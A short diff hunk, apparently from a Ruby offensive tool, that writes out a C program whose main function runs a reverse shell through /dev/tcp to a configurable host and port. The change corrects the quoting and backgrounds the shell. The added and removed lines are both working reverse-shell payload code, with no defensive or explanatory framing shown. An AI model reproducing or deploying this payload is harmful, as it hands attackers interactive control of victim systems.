@@ -46,6 +46,6 @@ sleep(1)
 open(file, 'w') { |f|
     f.puts "#include <stdio.h>"
     f.puts "int main() {"
-    f.puts "    system('#{shell} -i &> /dev/tcp/#{host}/#{port} 0>&1');"
+    f.puts "    system(\"#{shell} -i &> /dev/tcp/#{host}/#{port} 0>&1 &\");"
     f.puts "}"
 }
